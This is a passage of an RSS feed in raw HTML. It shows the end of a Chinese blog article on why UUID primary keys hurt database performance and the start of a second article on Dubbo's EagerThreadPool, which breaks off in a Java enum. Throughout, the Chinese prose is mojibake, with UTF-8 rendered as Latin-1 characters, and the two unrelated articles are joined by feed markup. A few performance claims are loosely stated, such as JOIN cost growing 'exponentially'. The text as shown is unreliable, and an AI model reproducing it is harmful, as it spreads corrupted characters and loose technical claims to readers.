<span class="hljs-comment">-- è‡ªå¢IDè¡¨ï¼šç´¢å¼•æ·±åº¦=3ï¼Œé¡µå¡«å……ç‡=89%</span>
<span class="hljs-comment">-- UUIDè¡¨ï¼šç´¢å¼•æ·±åº¦=4ï¼Œé¡µå¡«å……ç‡=67%ï¼Œç¢ç‰‡ç‡=24%</span>
</code></pre>
<h4 data-id="heading-4">2. å­˜å‚¨è†¨èƒ€ï¼šçœ‹ä¸è§çš„ç©ºé—´æµªè´¹</h4>
<ul>
<li>UUIDï¼ˆ36å­—ç¬¦å­—ç¬¦ä¸²ï¼‰â‰ˆ 16å­—èŠ‚ï¼ˆäºŒè¿›åˆ¶å­˜å‚¨ï¼‰</li>
<li>è‡ªå¢BIGINT â‰ˆ 8å­—èŠ‚</li>
<li><strong>é¢å¤–æˆæœ¬</strong>ï¼šæ¯ä¸ªäºŒçº§ç´¢å¼•éƒ½åŒ…å«ä¸»é”®å€¼ï¼Œæ‰€æœ‰ä½¿ç”¨UUIDä¸»é”®çš„è¡¨ï¼Œå…¶äºŒçº§ç´¢å¼•éƒ½ä¼šé¢å¤–å¢åŠ 8å­—èŠ‚å­˜å‚¨</li>
</ul>
<p>å¯¹äº10äº¿æ¡è®°å½•çš„è¡¨ï¼š</p>
<ul>
<li>ä¸»é”®ç´¢å¼•é¢å¤–ç©ºé—´ï¼šâ‰ˆ 8 GB</li>
<li>æ¯ä¸ªäºŒçº§ç´¢å¼•é¢å¤–ç©ºé—´ï¼šâ‰ˆ 8 GB Ã— ç´¢å¼•æ•°é‡</li>
</ul>
<h4 data-id="heading-5">3. æŸ¥è¯¢æ€§èƒ½è¡°å‡ï¼šJOINå’ŒèŒƒå›´æŸ¥è¯¢çš„å™©æ¢¦</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- UUIDæŸ¥è¯¢éœ€è¦å­—ç¬¦ä¸²æ¯”è¾ƒ</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> orders <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-string">'123e4567-e89b-12d3-a456-426614174000'</span>;

<span class="hljs-comment">-- æ•´å‹æ¯”è¾ƒæ•ˆç‡é«˜ä¸€ä¸ªæ•°é‡çº§</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> orders <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">123456789</span>;
</code></pre>
<p>åœ¨JOINæ“ä½œä¸­ï¼ŒUUIDçš„æ¯”è¾ƒæˆæœ¬ä¼šæŒ‡æ•°çº§æ”¾å¤§ï¼Œç‰¹åˆ«æ˜¯åœ¨æ•°æ®é‡å¤§çš„å…³è”æŸ¥è¯¢ä¸­ã€‚</p>
<h3 data-id="heading-6">ä¸‰ã€çœŸå®æ¡ˆä¾‹ï¼šç”µå•†è®¢å•è¡¨çš„æ•™è®­</h3>
<p>æˆ‘ä»¬æœ‰ä¸€ä¸ªæ ¸å¿ƒçš„<code>orders</code>è¡¨ï¼Œè®¾è®¡åˆæœŸä½¿ç”¨äº†UUIDv4ä½œä¸ºä¸»é”®ã€‚éšç€ä¸šåŠ¡å¢é•¿åˆ°æ•°åƒä¸‡è®°å½•ï¼Œå‡ºç°äº†ä»¥ä¸‹é—®é¢˜ï¼š</p>
<p><strong>ç°è±¡ï¼š</strong></p>
<ul>
<li>è®¢å•åˆ›å»ºAPIçš„P99å»¶è¿Ÿä»50mså¢é•¿åˆ°800ms</li>
<li>æ•°æ®åº“ç£ç›˜ç©ºé—´ä½¿ç”¨è¶…é¢„æœŸ40%</li>
<li>è®¢å•åˆ—è¡¨åˆ†é¡µæŸ¥è¯¢è¶Šæ¥è¶Šæ…¢</li>
</ul>
<p><strong>æ ¹æœ¬åŸå› åˆ†æï¼š</strong></p>
<ol>
<li>è®¢å•è¡¨æœ‰5ä¸ªäºŒçº§ç´¢å¼•ï¼Œæ¯ä¸ªç´¢å¼•éƒ½å­˜å‚¨äº†16å­—èŠ‚çš„UUID</li>
<li>è®¢å•åˆ›å»ºæ˜¯é«˜é¢‘æ“ä½œï¼ŒéšæœºUUIDå¯¼è‡´ä¸»é”®ç´¢å¼•ç¢ç‰‡ç‡è¾¾35%</li>
<li>è®¢å•æŸ¥è¯¢ç»å¸¸éœ€è¦JOINç”¨æˆ·è¡¨ã€å•†å“è¡¨ï¼ŒUUIDå­—ç¬¦ä¸²æ¯”è¾ƒæ¶ˆè€—å¤§é‡CPU</li>
</ol>
<p><strong>è§£å†³æ–¹æ¡ˆå¯¹æ¯”ï¼š</strong></p>








































<table><thead><tr><th>æ–¹æ¡ˆ</th><th>å­˜å‚¨èŠ‚çœ</th><th>å†™å…¥æ€§èƒ½æå‡</th><th>æŸ¥è¯¢æ€§èƒ½æå‡</th><th>å¤æ‚åº¦</th></tr></thead><tbody><tr><td>ä¿æŒUUIDv4</td><td>0%</td><td>0%</td><td>0%</td><td>ä½</td></tr><tr><td>åˆ‡æ¢ä¸ºè‡ªå¢ID</td><td>45%</td><td>320%</td><td>180%</td><td>é«˜</td></tr><tr><td>ä½¿ç”¨UUIDv7</td><td>0%</td><td>150%</td><td>90%</td><td>ä¸­</td></tr><tr><td>ä½¿ç”¨Snowflake</td><td>50%</td><td>280%</td><td>160%</td><td>ä¸­</td></tr></tbody></table>
<h3 data-id="heading-7">å››ã€ä½•æ—¶ä½¿ç”¨UUIDï¼Ÿä½•æ—¶é¿å…ï¼Ÿ</h3>
<h4 data-id="heading-8">âœ… é€‚åˆä½¿ç”¨UUIDçš„åœºæ™¯ï¼š</h4>
<ol>
<li><strong>å¤šç³»ç»Ÿé›†æˆ</strong>ï¼šéœ€è¦è·¨å¤šä¸ªç‹¬ç«‹ç³»ç»Ÿç”Ÿæˆå”¯ä¸€ID</li>
<li><strong>å‰ç«¯ç”ŸæˆID</strong>ï¼šç¦»çº¿åº”ç”¨æˆ–éœ€è¦å®¢æˆ·ç«¯ç”Ÿæˆæ ‡è¯†</li>
<li><strong>å®‰å…¨è¦æ±‚é«˜</strong>ï¼šéœ€è¦é¿å…IDçŒœæµ‹å’Œéå†</li>
<li><strong>åˆ†åº“åˆ†è¡¨é”®</strong>ï¼šéœ€è¦å…¨å±€å”¯ä¸€ä¸”åˆ†å¸ƒå‡åŒ€</li>
</ol>
<h4 data-id="heading-9">âŒ åº”é¿å…ä½¿ç”¨UUIDçš„åœºæ™¯ï¼š</h4>
<ol>
<li><strong>å•ä¸€æ•°æ®åº“å†…çš„ä¸»é”®</strong></li>
<li><strong>é«˜é¢‘å†™å…¥çš„è¡¨</strong></li>
<li><strong>éœ€è¦èŒƒå›´æŸ¥è¯¢æˆ–ç»å¸¸æ’åºçš„è¡¨</strong></li>
<li><strong>å­˜å‚¨æ•æ„Ÿå‹åº”ç”¨</strong>ï¼ˆæˆæœ¬æ§åˆ¶ä¸¥æ ¼ï¼‰</li>
</ol>
<h3 data-id="heading-10">äº”ã€ä¼˜åŒ–æ–¹æ¡ˆä¸è¿ç§»ç­–ç•¥</h3>
<h4 data-id="heading-11">æ–¹æ¡ˆ1ï¼šæœ‰åºUUIDï¼ˆUUIDv7ï¼‰</h4>
<p>UUIDv7å°†æ—¶é—´æˆ³ä½œä¸ºå‰48ä½ï¼Œä¿è¯äº†æ—¶é—´æœ‰åºæ€§ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-type">timestamp</span>ï¼ˆ<span class="hljs-number">48</span>ä½ï¼‰ <span class="hljs-operator">+</span> éšæœºæ•°ï¼ˆ<span class="hljs-number">80</span>ä½ï¼‰
</code></pre>
<p>è¿™å¤§å¹…æ”¹å–„äº†ç´¢å¼•æ€§èƒ½ï¼ŒåŒæ—¶ä¿ç•™äº†UUIDçš„å”¯ä¸€æ€§ä¼˜åŠ¿ã€‚</p>
<h4 data-id="heading-12">æ–¹æ¡ˆ2ï¼šç»„åˆé”®æ–¹æ¡ˆ</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
  id <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,  <span class="hljs-comment">-- å†…éƒ¨ä½¿ç”¨</span>
  public_id <span class="hljs-type">CHAR</span>(<span class="hljs-number">36</span>) <span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,    <span class="hljs-comment">-- å¯¹å¤–æš´éœ²</span>
  <span class="hljs-comment">-- å…¶ä»–å­—æ®µ...</span>
);

<span class="hljs-comment">-- å¯¹å¤–APIä½¿ç”¨public_id</span>
<span class="hljs-comment">-- å†…éƒ¨å…³è”ä½¿ç”¨id</span>
</code></pre>
<h4 data-id="heading-13">æ–¹æ¡ˆ3ï¼šåˆ†é˜¶æ®µè¿ç§»ç­–ç•¥</h4>
<p>å¦‚æœå·²æœ‰ç³»ç»Ÿä½¿ç”¨äº†UUIDï¼Œå¯ä»¥é‡‡ç”¨æ¸è¿›å¼è¿ç§»ï¼š</p>
<ol>
<li><strong>é˜¶æ®µ1</strong>ï¼šæ–°è¡¨ä½¿ç”¨è‡ªå¢IDï¼Œè€è¡¨ä¿æŒç°çŠ¶</li>
<li><strong>é˜¶æ®µ2</strong>ï¼šä¸ºUUIDè¡¨æ·»åŠ è‡ªå¢IDåˆ—ï¼Œå»ºç«‹æ˜ å°„</li>
<li><strong>é˜¶æ®µ3</strong>ï¼šé€æ­¥å°†ä¸šåŠ¡é€»è¾‘åˆ‡æ¢åˆ°è‡ªå¢IDå…³è”</li>
<li><strong>é˜¶æ®µ4</strong>ï¼šåœ¨ä¸šåŠ¡ä½å³°æœŸå®Œæˆæœ€ç»ˆåˆ‡æ¢</li>
</ol>
<h3 data-id="heading-14">å…­ã€æœ€ä½³å®è·µå»ºè®®</h3>
<ol>
<li>
<p><strong>ä¼˜å…ˆä½¿ç”¨æ•°æ®åº“è‡ªå¢IDæˆ–åºåˆ—</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- PostgreSQL</span>
id BIGSERIAL <span class="hljs-keyword">PRIMARY</span> KEY

<span class="hljs-comment">-- MySQL</span>
id <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY

<span class="hljs-comment">-- SQL Server</span>
id <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">IDENTITY</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">PRIMARY</span> KEY
</code></pre>
</li>
<li>
<p><strong>åˆ†å¸ƒå¼ç³»ç»Ÿè€ƒè™‘æœ‰åºç®—æ³•</strong></p>
<ul>
<li>SnowflakeåŠå…¶å˜ä½“ï¼ˆ63ä½æœ‰åºæ•´å‹ï¼‰</li>
<li>ULIDï¼ˆUUIDv7çš„æ›¿ä»£ï¼Œæ›´å‹å¥½çš„å­—ç¬¦ä¸²æ ¼å¼ï¼‰</li>
<li>åŸºäºRedis/ZooKeeperçš„IDç”ŸæˆæœåŠ¡</li>
</ul>
</li>
<li>
<p><strong>å¦‚æœå¿…é¡»ä½¿ç”¨UUID</strong></p>
<ul>
<li>ä¼˜å…ˆé€‰æ‹©UUIDv7ï¼ˆæ—¶é—´æœ‰åºç‰ˆæœ¬ï¼‰</li>
<li>è€ƒè™‘å­˜å‚¨ä¸º<code>BINARY(16)</code>è€Œé<code>CHAR(36)</code></li>
<li>å®šæœŸé‡å»ºç´¢å¼•å‡å°‘ç¢ç‰‡</li>
</ul>
</li>
<li>
<p><strong>ç›‘æ§æŒ‡æ ‡</strong></p>
<ul>
<li>ç´¢å¼•ç¢ç‰‡ç‡ï¼ˆ&gt;30%éœ€è¦å…³æ³¨ï¼‰</li>
<li>é¡µåˆ†è£‚é¢‘ç‡</li>
<li>ç¼“å­˜å‘½ä¸­ç‡å˜åŒ–</li>
</ul>
</li>
</ol>
<h3 data-id="heading-15">ä¸ƒã€ç»“è®º</h3>
<p>UUIDä¸æ˜¯â€œé“¶å¼¹â€ï¼Œå®ƒåœ¨è§£å†³åˆ†å¸ƒå¼å”¯ä¸€æ€§é—®é¢˜çš„åŒæ—¶ï¼Œå¸¦æ¥äº†æ•°æ®åº“æ€§èƒ½çš„éšå½¢æˆæœ¬ã€‚æŠ€æœ¯é€‰å‹éœ€è¦æƒè¡¡ï¼š</p>
<ul>
<li><strong>å”¯ä¸€æ€§</strong> vs <strong>æ€§èƒ½</strong></li>
<li><strong>ä¾¿æ·æ€§</strong> vs <strong>å¯ç»´æŠ¤æ€§</strong></li>
<li><strong>çŸ­æœŸæ•ˆç›Š</strong> vs <strong>é•¿æœŸæˆæœ¬</strong></li>
</ul>
<p>åœ¨æ•°æ®åº“è®¾è®¡ä¸­ï¼Œæœ€â€œç®€å•â€çš„é€‰æ‹©å¾€å¾€ä¸æ˜¯æœ€â€œæ­£ç¡®â€çš„é€‰æ‹©ã€‚ç†è§£æ¯ç§IDç”Ÿæˆæœºåˆ¶èƒŒåçš„æƒè¡¡ï¼Œæ ¹æ®å®é™…åœºæ™¯åšå‡ºåˆç†é€‰æ‹©ï¼Œæ˜¯æ¶æ„æˆç†Ÿåº¦çš„é‡è¦ä½“ç°ã€‚</p>
<p><strong>æœ‰æ—¶å€™ï¼Œæ”¾å¼ƒä¸€äº›â€œç‚«æŠ€â€çš„è§£å†³æ–¹æ¡ˆï¼Œå›å½’ç®€å•å¯é çš„æ–¹æ¡ˆï¼Œåè€Œæ˜¯æœ€é«˜çº§çš„æŠ€æœ¯å†³ç­–ã€‚</strong></p>
<p><em>ä½ æ˜¯å¦ä¹Ÿåœ¨UUIDä¸Šè¸©è¿‡å‘ï¼Ÿæˆ–è€…æœ‰æˆåŠŸè¿ç§»çš„ç»éªŒï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«ä½ çš„æ•…äº‹ã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é«˜æ€§èƒ½çº¿ç¨‹æ± å®è·µï¼šDubbo EagerThreadPool è®¾è®¡ä¸åº”ç”¨]]></title>    <link>https://juejin.cn/post/7604345576177451046</link>    <guid>https://juejin.cn/post/7604345576177451046</guid>    <pubDate>2026-02-09T09:46:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604345576177451046" data-draft-id="7604471065860407347" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é«˜æ€§èƒ½çº¿ç¨‹æ± å®è·µï¼šDubbo EagerThreadPool è®¾è®¡ä¸åº”ç”¨"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-02-09T09:46:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sinoçˆ±å­¦ä¹ "/> <meta itemprop="url" content="https://juejin.cn/user/1873223544473431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é«˜æ€§èƒ½çº¿ç¨‹æ± å®è·µï¼šDubbo EagerThreadPool è®¾è®¡ä¸åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223544473431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sinoçˆ±å­¦ä¹ 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:46:52.000Z" title="Mon Feb 09 2026 09:46:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆéœ€è¦"Eager"æ¨¡å¼ï¼Ÿ</h2>
<h3 data-id="heading-1">1.1 æ ‡å‡† JDK çº¿ç¨‹æ± çš„ç“¶é¢ˆ</h3>






























<table><thead><tr><th>é˜¶æ®µ</th><th>æ ‡å‡† ThreadPoolExecutor</th><th>é—®é¢˜</th></tr></thead><tbody><tr><td>ç¬¬ä¸€é˜¶æ®µ</td><td>æ ¸å¿ƒçº¿ç¨‹æ•° &lt; Core</td><td>æ­£å¸¸åˆ›å»ºçº¿ç¨‹</td></tr><tr><td>ç¬¬äºŒé˜¶æ®µ</td><td>æ ¸å¿ƒçº¿ç¨‹æ»¡ â†’ <strong>ä»»åŠ¡å…¥é˜Ÿ</strong></td><td><strong>ä»»åŠ¡æ’é˜Ÿç­‰å¾…ï¼ŒRT ä¸Šå‡</strong></td></tr><tr><td>ç¬¬ä¸‰é˜¶æ®µ</td><td>é˜Ÿåˆ—æ»¡ â†’ åˆ›å»ºæœ€å¤§çº¿ç¨‹</td><td>å»¶è¿Ÿå“åº”</td></tr><tr><td>ç¬¬å››é˜¶æ®µ</td><td>è¾¾åˆ° Max â†’ è§¦å‘æ‹’ç»ç­–ç•¥</td><td>æœåŠ¡é™çº§</td></tr></tbody></table>
<p><strong>æ ¸å¿ƒç—›ç‚¹</strong>ï¼šIO å¯†é›†å‹åœºæ™¯ä¸‹ï¼Œä»»åŠ¡åœ¨é˜Ÿåˆ—ä¸­å †ç§¯ä¼šå¯¼è‡´å“åº”æ—¶é—´é£™å‡ï¼Œæ— æ³•å¿«é€Ÿåˆ©ç”¨ç³»ç»Ÿèµ„æºã€‚</p>
<h3 data-id="heading-2">1.2 Eager æ¨¡å¼çš„ä¼˜åŒ–é€»è¾‘</h3>
<pre><code class="hljs">æ ‡å‡†æ¨¡å¼ï¼šæ ¸å¿ƒçº¿ç¨‹æ»¡ â†’ é˜Ÿåˆ—ç§¯å‹ â†’ æœ€å¤§çº¿ç¨‹ â†’ æ‹’ç»
Eager æ¨¡å¼ï¼šæ ¸å¿ƒçº¿ç¨‹æ»¡ â†’ ç«‹å³æ‰©çº¿ç¨‹ â†’ é˜Ÿåˆ—å…œåº• â†’ æ‹’ç»
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>é«˜å¹¶å‘ä½å»¶è¿Ÿçš„ API æ¥å£</li>
<li>IO å¯†é›†å‹ä»»åŠ¡ï¼ˆç½‘ç»œè¯·æ±‚ã€æ•°æ®åº“æ“ä½œï¼‰</li>
<li>éœ€è¦å¿«é€Ÿå“åº”ã€ä¸å¸Œæœ›ä»»åŠ¡æ’é˜Ÿçš„ä¸šåŠ¡</li>
</ul>
<hr/>
<h2 data-id="heading-3">äºŒã€æ ¸å¿ƒå®ç°æ¶æ„</h2>
<h3 data-id="heading-4">2.1 æ•´ä½“æ¶æ„å›¾</h3>
<pre><code class="hljs language-lua" lang="lua">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         BusinessPoolDefine (æšä¸¾)        â”‚
â”‚    å®šä¹‰ä¸šåŠ¡ç»´åº¦: è®¢å•/ç”¨æˆ·/å¯¼å‡ºç­‰           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      DynamicThreadPoolManager           â”‚
â”‚    ç»Ÿä¸€æ³¨å†Œä¸­å¿ƒ: åˆå§‹åŒ– + åŠ¨æ€æ›´æ–°          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      EagerThreadPoolExecutor            â”‚
â”‚    æ ¸å¿ƒæ‰§è¡Œå™¨: é‡å†™ <span class="hljs-built_in">execute</span> é€»è¾‘           â”‚
â”‚         â†“ ä¾èµ– â†“                        â”‚
â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚    â”‚ EagerQueue   â”‚  â”‚ æ‹’ç»ç­–ç•¥      â”‚ â”‚
â”‚    â”‚ (è‡ªå®šä¹‰offer) â”‚  â”‚ (forceOffer) â”‚ â”‚
â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      NacosDynamicListener               â”‚
â”‚    é…ç½®ä¸­å¿ƒ: å®æ—¶çƒ­æ›´æ–°çº¿ç¨‹æ± å‚æ•°            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-5">2.2 å…³é”®ç»„ä»¶è¯¦è§£</h3>
<h4 data-id="heading-6">â‘  å¼ºç±»å‹ä¸šåŠ¡æšä¸¾ï¼ˆæ²»ç†åŸºç¡€ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Getter</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">BusinessPoolDefine</span> {
    <span class="hljs-comment">// ä¸šåŠ¡å      æ ¸å¿ƒçº¿ç¨‹  æœ€å¤§çº¿ç¨‹  é˜Ÿåˆ—å®¹é‡</span>
    ORDER_PAY(<span class="hljs-string">"order-pay"</span>,    <span class="hljs-number">10</span>,  <span class="hljs-number">50</span>,  <span class="hljs-number">200</span>),   <span class="hljs-comment">// æ”¯ä»˜æ ¸å¿ƒé“¾è·¯</span>
    USER_REG(<span class="hljs-string">"user-reg"</span>,       <span class="hljs-number">5</span>,  <span class="hljs-number">20</span>,  <span class="hljs-number">100</span>),   <span class="hljs-comment">// ç”¨æˆ·æ³¨å†Œ</span>
